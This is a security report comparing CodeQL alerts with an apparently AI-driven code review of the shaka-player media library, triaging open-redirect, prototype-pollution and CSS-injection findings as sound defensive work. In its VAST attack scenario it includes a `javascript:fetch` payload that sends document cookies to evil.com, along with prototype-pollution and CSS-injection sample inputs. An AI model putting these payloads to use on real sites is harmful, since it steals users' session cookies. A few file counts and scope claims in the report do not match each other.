# Security Comparison Report — CodeQL vs. AI Security Review

| | |
|---|---|
| **Repository** | `dsp-testing/shaka-player` |
| **Branch** | `main` |
| **Report Date** | 2026-04-02 |
| **CodeQL Tool** | CodeQL (GitHub Code Scanning) |
| **Security Review** | `security-review` skill (Copilot CLI) |

---

## Executive Summary

| Severity | CodeQL | Security Review |
|---|---:|---:|
| 🔴 CRITICAL | 0 | 0 |
| 🟠 HIGH | 3 | 2 |
| 🟡 MEDIUM | 3 | 1 |
| 🔵 LOW | 0 | 1 |
| ⚪ INFO | 0 | 1 |
| **TOTAL** | **6** | **5** |

### Coverage Overlap

```
   ┌──────────────┐         ┌──────────────┐
   │   CodeQL     │         │   Security   │
   │   Only       │ Overlap │   Review     │
   │              │         │   Only       │
   │   6          │   0     │   5          │
   │   findings   │         │   findings   │
   └──────────────┘         └──────────────┘
```

> [!IMPORTANT]
> **Zero overlap.** Each tool found completely different issues in different
> files. CodeQL flagged `demo/` and `test/` code; the Security Review flagged
> `lib/` runtime code. The two tools surfaced mutually exclusive finding sets —
> a clear demonstration of complementary coverage.

---

## CodeQL-Only Findings

### CQ-1 — Client-side URL redirection · `lib/player.js:7242`

| | |
|---|---|
| **Rule** | `js/client-side-unvalidated-url-redirection` |
| **Severity** | 🟡 MEDIUM |
| **Verdict** | **CONTEXT-DEPENDENT** |

```js
// lib/player.js:7230-7242
async addSrcTrackElement_(uri, language, kind, mimeType, label, adCuePoints) {
  if (mimeType != 'text/vtt' || adCuePoints.length) {
    const data = await this.getTextData_(uri);
    const vvtText = this.convertToWebVTT_(data, mimeType, adCuePoints);
    const blob = new Blob([vvtText], {type: 'text/vtt'});
    uri = shaka.media.MediaSourceEngine.createObjectURL(blob);
  }
  const trackElement = document.createElement('track');
  trackElement.src = this.cmcdManager_.appendTextTrackData(uri);  // ← flagged
```

**Assessment:**
- The `uri` parameter comes from the public API method `addTextTrackAsync(uri, ...)`,
  which the application developer calls explicitly.
- `<track src>` does **not** execute `javascript:` URLs — it only fetches subtitle data.
- The trust boundary is the application developer, not an end user.

**Why the Security Review missed it:** Public library API parameters are treated as
developer-controlled (trusted by design). This is the correct trust model for a
media library.

**Action:** None required. Documentation could note the developer's responsibility
to validate URIs.

---

### CQ-2 — Prototype-polluting assignment · `test/test/assets/screenshots/review.html:271`

| | |
|---|---|
| **Rule** | `js/prototype-polluting-assignment` |
| **Severity** | 🟡 MEDIUM |
| **Verdict** | **TRUE POSITIVE** (minimal impact) |

```js
// test/test/assets/screenshots/review.html:268-273
for (const param of location.hash.substr(1).split('&')) {
  const [key, value] = param.split('=');
  try {
    allOptions[key][decodeURIComponent(value)].checked = true;  // ← flagged
  } catch (error) {}  // ignore errors
}
```

**Assessment:**
- A URL like `#__proto__=toString` accesses `Object.prototype.toString` and sets
  `.checked` on it — which is pollution.
- However: this is an **internal screenshot-comparison tool** used by developers
  when reviewing visual regression test output. It is not deployed publicly.
- Wrapped in `try/catch` — most pollution payloads will throw before mutating.

**Why the Security Review missed it:** Scope gap — the review focused on `lib/`,
`ui/`, and `demo/` runtime code. The `test/test/assets/` directory contains
internal developer tooling.

**Action (optional):**
```js
if (key === '__proto__' || key === 'constructor') continue;
```

---

### CQ-3 — Incomplete URL substring sanitization · `demo/asset_card.js:82`

| | |
|---|---|
| **Rule** | `js/incomplete-url-substring-sanitization` |
| **Severity** | 🟠 HIGH |
| **Verdict** | **FALSE POSITIVE** |

```js
// demo/asset_card.js:67-86
webpSource.srcset = asset.iconUri.replace('.png', '.webp');  // already used
pngSource.srcset = asset.iconUri;                            // already used
img.src = asset.iconUri;                                     // already used!

// It can only be guaranteed that they have a webp version if they are on
// our server.
if (asset.iconUri.startsWith('https://storage.googleapis.com')) {  // ← flagged
  picture.appendChild(webpSource);
}
picture.appendChild(pngSource);
```

**Assessment:**
- CodeQL is correct that `startsWith('https://storage.googleapis.com')` can be
  bypassed by `https://storage.googleapis.com.evil.net`.
- **But bypassing this check grants the attacker nothing** — `asset.iconUri` is
  already assigned to `img.src` (line 77) and `pngSource.srcset` (line 72)
  *before* the check runs. The check only decides whether to *also* append a
  webp `<source>` with the same URL.
- This is a **CDN feature-detection optimization**, not a security control.

**Action:** Mark as false positive in CodeQL.

---

### CQ-4 & CQ-5 — DOM text reinterpreted as HTML · `demo/custom.js:916, 929`

| | |
|---|---|
| **Rule** | `js/xss-through-dom` |
| **Severity** | 🟠 HIGH (×2) |
| **Verdict** | **FALSE POSITIVE** (×2) |

```js
// demo/custom.js:910-933
const iconSetup = (input, container) => {
  if (assetInProgress.iconUri) {
    input.value = assetInProgress.iconUri;
    const img = document.createElement('img');
    img.src = input.value;                          // ← line 916, flagged
    iconDiv.appendChild(img);
  }
};
const iconOnChange = (input) => {
  shaka.util.Dom.removeAllChildren(iconDiv);
  assetInProgress.iconUri = input.value;
  if (input.value) {
    const img = document.createElement('img');
    img.src = input.value;                          // ← line 929, flagged
    iconDiv.appendChild(img);
  }
};
```

**Assessment:**
- `<img src>` does **not** execute `javascript:` URLs in any modern browser
  ([HTML spec — `attr-img-src`](https://html.spec.whatwg.org/#attr-img-src)).
- The user is typing **their own** URL into a demo configuration form. There is
  no cross-user attack surface — this is "self-XSS" at worst, which has zero
  security impact.

**Action:** Mark both as false positives in CodeQL.

---

### CQ-6 — Exception text reinterpreted as HTML · `demo/main.js:2061`

| | |
|---|---|
| **Rule** | `js/xss-through-exception` |
| **Severity** | 🟡 MEDIUM |
| **Verdict** | **FALSE POSITIVE** |

```js
// demo/main.js:2030-2067
onError_(error) {
  const message = error.message || ('Error code ' + error.code);
  let href = '';
  if (error.code) {
    href = '../docs/api/shaka.util.Error.html#value:' + error.code;  // prefix
  }
  this.handleError_(severity, message, href);
}

handleError_(severity, message, href) {
  this.errorDisplayLink_.href = href;                // ← line 2061, flagged
  if (this.errorDisplayLink_.textContent === undefined) {
    this.errorDisplayLink_.innerText = message;      // safe — innerText
  } else {
    this.errorDisplayLink_.textContent = message;    // safe — textContent
  }
```

**Assessment:**
- The `href` is built as `'../docs/api/shaka.util.Error.html#value:' + error.code`.
  The hardcoded relative-path prefix makes `javascript:` scheme injection
  impossible — anything appended is just a URL fragment.
- `error.code` is a numeric enum (`shaka.util.Error.Code`).
- The other call site (line 175) uses a hardcoded GitHub URL.
- The `message` is rendered via `textContent`/`innerText` — no HTML injection.

**Action:** Mark as false positive in CodeQL.

---

## Security-Review-Only Findings

### SR-1 & SR-2 — Open redirect via VAST `<ClickThrough>` · `lib/ads/interstitial_ad_manager.js:1155, 1429` ⭐

| | |
|---|---|
| **Category** | Open Redirect → potential XSS |
| **Severity** | 🟠 HIGH (×2) |
| **Verdict** | **TRUE POSITIVE** |

**Source — `lib/ads/ad_utils.js:93-100`:**
```js
const videoClicks = TXml.findChild(linear, 'VideoClicks');
if (videoClicks) {
  const clickThroughElement = TXml.findChild(videoClicks, 'ClickThrough');
  if (clickThroughElement) {
    const clickUrl = TXml.getContents(clickThroughElement);
    if (clickUrl) {
      clickThroughUrl = clickUrl;        // ← raw VAST XML content, no validation
    }
  }
}
```

**Sink — `lib/ads/interstitial_ad_manager.js:1149-1156`:**
```js
if (interstitial.clickThroughUrl) {
  this.adEventManager_.listen(htmlElement, 'click', (e) => {
    if (!interstitial.clickThroughUrl) {
      return;
    }
    this.sendEvent_(shaka.ads.Utils.AD_CLICKED);
    window.open(interstitial.clickThroughUrl, '_blank');   // ← unvalidated
  });
}
```

**Attack scenario:**
1. App is configured to load ads from a third-party VAST ad server (or a
   compromised first-party one).
2. VAST XML response contains:
   ```xml
   <ClickThrough>https://shaka-player-secure-update.evil.net/</ClickThrough>
   ```
   or
   ```xml
   <ClickThrough>javascript:fetch('//evil.com/'+document.cookie)</ClickThrough>
   ```
3. User clicks the ad → browser opens attacker payload.

> [!NOTE]
> Modern browsers block `javascript:` in `window.open()` in many contexts, but
> open redirect to attacker-controlled phishing pages works in **all** browsers.

**Why CodeQL missed it:** CodeQL's taint tracking starts from HTTP request
handlers (`req.params`, `req.query`, etc.). The taint here originates from
**XML parsing of a network response** — `TXml.getContents(clickThroughElement)`.
CodeQL does not model the response body of fetched VAST manifests as a taint
source, so the entire flow from VAST XML → `window.open()` is invisible to it.

**Could a custom CodeQL query catch this?** Yes — add `TXml.getContents` and
`TXml.getTextContents` as taint sources, and `window.open`'s first argument as
a sink. The flow is short and direct.

**Recommended fix:**
```js
const url = interstitial.clickThroughUrl;
if (url && /^https?:\/\//i.test(url)) {
  window.open(url, '_blank', 'noopener,noreferrer');
}
```

---

### SR-3 — CSS `url()` injection from TTML · `lib/text/ui_text_displayer.js:900`

| | |
|---|---|
| **Category** | CSS Injection → SSRF-like / UI Redress |
| **Severity** | 🟡 MEDIUM |
| **Verdict** | **TRUE POSITIVE** (not script execution) |

**Source — `lib/text/ttml_text_parser.js:239-244, 723`:**
```js
} else if (uri && backgroundImage && !backgroundImage.startsWith('#')) {
  const baseUri = new goog.Uri(uri);
  const relativeUri = new goog.Uri(backgroundImage);   // ← from TTML attribute
  const newUri = baseUri.resolve(relativeUri).toString();
  if (newUri) {
    imageUri = newUri;          // ← may resolve to arbitrary cross-origin URL
  }
}
// ...
cue.backgroundImage = imageUri;  // line 723
```

**Sink — `lib/text/ui_text_displayer.js:899-900`:**
```js
if (cue.backgroundImage) {
  style.backgroundImage = 'url(\'' + cue.backgroundImage + '\')';
```

**Assessment:**
- Modern browsers do **not** execute `javascript:` inside CSS `url()`, and CSSOM
  property setters reject multi-property injection. So this is **not XSS**.
- However, it **is**:
  - **Arbitrary cross-origin GET** — attacker-controlled TTML causes the
    victim's browser to fetch any URL (privacy beacon, GET-based CSRF,
    intranet probing).
  - **UI redress** — attacker-controlled image overlays the subtitle area.
  - **Single-quote breakout** — if the URL contains `'`, the resulting
    `url('foo'bar')` is malformed and the browser drops the property.
    Annoying but not exploitable.
- The TTML file is fetched from a media server. If that server is compromised or
  hosts user-uploaded content, this becomes exploitable.

**Why CodeQL missed it:** Same root cause as SR-1 — the taint source is parsed
XML content from a network response (`TXml.getAttributeNSList`), which CodeQL
does not model. Additionally, `style.backgroundImage` is not in CodeQL's
standard XSS sink list.

**Recommended fix:** Restrict `cue.backgroundImage` to `data:image/*` and
same-origin `http(s)` URLs.

---

### SR-4 — Style property injection from TTML · `lib/text/ui_text_displayer.js:897, 929`

| | |
|---|---|
| **Category** | CSS Injection |
| **Severity** | 🔵 LOW |
| **Verdict** | **CONTEXT-DEPENDENT** (largely mitigated by browser) |

```js
// lib/text/ui_text_displayer.js
style.textShadow = cue.textShadow;        // line 897
if (cue.border) {
  elem.style.border = cue.border;         // line 929
}
```

**Assessment:**
- CSSOM property setters validate the value against the property's grammar.
  `elem.style.border = "1px solid; background: url(evil)"` → **rejected** by
  the browser (invalid `border` value).
- An attacker can set valid-but-unusual values (e.g., a 100px wide border), but
  cannot escape into other properties or scripts.
- `convertTTMLrgbaToHTMLrgba_` (line 523) passes non-`rgba()` values through
  unchanged — it is a format converter, not a sanitizer.

**Action:** None required. The CSSOM provides adequate protection.

---

### SR-5 — TLS downgrade configuration · `lib/net/networking_engine.js:484`

| | |
|---|---|
| **Category** | Insecure Configuration |
| **Severity** | ⚪ INFO |
| **Verdict** | **CONTEXT-DEPENDENT** (opt-in developer config) |

```js
// lib/net/networking_engine.js:483-484
if (this.config_.forceHTTP) {
  request.uris[index] = request.uris[index].replace('https://', 'http://');
}
```

**Assessment:**
- Explicit, documented configuration option (default: `false`).
- The naive `.replace()` also corrupts URLs containing `https://` as a substring.
- Risk: if a developer enables this in production, DRM keys and manifests travel
  in cleartext.

**Action (optional):** Document as test-only; emit a console warning when enabled.

---

## Notable Positive Result — Prototype Pollution Defense

The Security Review specifically inspected `lib/util/config_utils.js` (the
user-config merge path) for prototype pollution and found it **explicitly
defended**:

```js
// lib/util/config_utils.js:34, 57-60
const blockedKeys = new Set(['__proto__', 'constructor', 'prototype']);
// ...
if (blockedKeys.has(k)) {
  shaka.log.alwaysError('Invalid config, dangerous key ' + subPath);
  isValid = false;
}
```

CodeQL flagged a prototype-pollution risk in **test tooling**
(`review.html:271`) but found nothing in the runtime config merge — because
there is nothing to find. The runtime path is correctly hardened.

---

## Comparison Summary

| # | Category | File:Line | CodeQL | Review | True Positive |
|---:|---|---|---|---|---|
| 1 | Open Redirect (track) | `lib/player.js:7242` | 🟡 MED | — | CTX |
| 2 | Prototype Pollution | `test/.../review.html:271` | 🟡 MED | — | ✅ (low) |
| 3 | URL Substring Sanitization | `demo/asset_card.js:82` | 🟠 HIGH | — | ❌ FP |
| 4 | DOM XSS (`img.src`) | `demo/custom.js:916` | 🟠 HIGH | — | ❌ FP |
| 5 | DOM XSS (`img.src`) | `demo/custom.js:929` | 🟠 HIGH | — | ❌ FP |
| 6 | XSS via Exception | `demo/main.js:2061` | 🟡 MED | — | ❌ FP |
| 7 | Open Redirect (VAST) | `lib/ads/interstitial_ad_manager.js:1155` | — | 🟠 HIGH | ✅ |
| 8 | Open Redirect (VAST) | `lib/ads/interstitial_ad_manager.js:1429` | — | 🟠 HIGH | ✅ |
| 9 | CSS `url()` Injection | `lib/text/ui_text_displayer.js:900` | — | 🟡 MED | ✅ |
| 10 | Style Prop Injection | `lib/text/ui_text_displayer.js:929` | — | 🔵 LOW | CTX |
| 11 | TLS Downgrade Config | `lib/net/networking_engine.js:484` | — | ⚪ INFO | CTX |

**Legend:** `—` = not flagged · `✅` = true positive · `❌ FP` = false positive · `CTX` = context-dependent

---

## Strengths & Blind Spots

| Dimension | CodeQL | Security Review |
|---|---|---|
| **Approach** | Dataflow taint tracking from HTTP/DOM sources. Pattern-precise. | Trust-boundary reasoning. Treated remote manifests (VAST/TTML) as untrusted, then traced to sinks. |
| **Strengths** | • Caught `location.hash` → object key (subtle prototype path)<br>• Exhaustive — scanned every file including test assets<br>• Precise on syntactic patterns (`startsWith` bypass) | • Found the only HIGH true positives in the codebase<br>• Modeled XML response bodies (VAST, TTML) as taint sources<br>• Verified prototype-pollution defense exists in `config_utils.js`<br>• Confirmed `insertAdjacentHTML` in `ui/controls.js:1428` is hardcoded SVG |
| **Blind spots** | • Network response bodies are not modeled as taint sources — missed the entire VAST/TTML attack surface<br>• CSSOM and `window.open` sinks not in default sink list<br>• Cannot reason about semantic purpose ("this check is a CDN feature flag, not auth") | • Skipped `test/` tooling directory (low blast radius, but missed `review.html` prototype pollution)<br>• Treats public-API params as trusted (correct for libraries) |
| **False positives** | **4 of 6 (67%)** — all in `demo/` where self-input or hardcoded prefix neutralizes the sink | **0 of 5** confirmed FPs. 2 of 5 are CTX (downgraded after self-verification). |
| **Coverage** | 6 alerts across 5 files (4 demo, 1 test, 1 lib) | 5 findings across 4 files (all in `lib/` runtime) |

---

## Recommendations

### 1. Immediate Actions

- **`lib/ads/interstitial_ad_manager.js:1155, 1429`** — Add scheme allowlist
  (`^https?://`) before `window.open()`. Add `'noopener,noreferrer'`. This is
  the only HIGH-severity true positive in either tool's output.
- **`lib/text/ui_text_displayer.js:900`** — Restrict `cue.backgroundImage` to
  `data:image/*` or same-origin URLs.

### 2. CodeQL Triage

- **Dismiss as false positive:** alerts #3, #4, #5, #6 (`demo/` self-input,
  `img.src` not an XSS sink, hardcoded `href` prefix).
- **Optionally fix #2** (`review.html` — internal tool, two-line guard).
- **Leave #1 open** as a documentation reminder for API users.

### 3. Coverage Improvements

- **CodeQL:** Write a custom query that adds `TXml.getContents`,
  `TXml.getTextContents`, and `TXml.getAttributeNSList` as taint sources. This
  would have caught the VAST and TTML findings — the highest-value bugs in this
  comparison.
- **Security Review:** Include `test/test/assets/` in scope on next pass.

### 4. Process

> [!TIP]
> Treat the tools as **complementary**, not redundant. Zero overlap on this run
> is the strongest possible signal that running both is worthwhile.
>
> Use CodeQL for **breadth** (every file, every push) and the security review
> for **depth** (trust-boundary reasoning at release gates). The VAST
> `window.open()` finding is the textbook example: trivially exploitable,
> completely invisible to default CodeQL.

---

## Scan Details

| Metric | Count |
|---|---:|
| CodeQL alerts analyzed | 6 |
| Security review findings | 5 |
| Total unique findings | 11 |
| Overlapping findings | 0 |
| True positives confirmed | 4 (1 CodeQL, 3 Review) |
| False positives identified | 4 (4 CodeQL, 0 Review) |
| Context-dependent | 3 (1 CodeQL, 2 Review) |
